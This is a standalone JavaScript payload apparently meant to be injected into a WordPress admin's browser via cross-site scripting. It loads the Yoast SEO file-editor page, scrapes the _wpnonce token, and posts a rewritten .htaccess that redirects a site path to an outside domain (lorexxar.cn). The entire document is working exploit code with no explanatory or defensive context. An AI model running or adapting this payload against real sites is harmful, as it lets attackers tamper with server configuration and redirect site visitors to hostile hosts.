
url = window.location.href;
url = url.split('wp-admin')[0];
p = 'wp-admin/admin.php?';
q = 'page=wpseo_tools&tool=file-editor';
s = "%23%20BEGIN%20WordPress%0A%3CIfModule%20mod_rewrite.c%3E%0ARedirect%20%2fwordpress4.8%20https%3A%2f%2florexxar.cn%0A%3C%2fIfModule%3E%0A%23%20END%20WordPress";


a = new XMLHttpRequest();
a.open('GET', url+p+q, 0);
a.send();

ss = '_wpnonce=' + a.responseText.match(/nonce" value="([^"]*?)"/g)[1].match(/\w+/g)[2] +
'&htaccessnew=' + s + '&submithtaccess=Save+changes+to+.htaccess';

b = new XMLHttpRequest();
b.open('POST', url+p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send(ss);

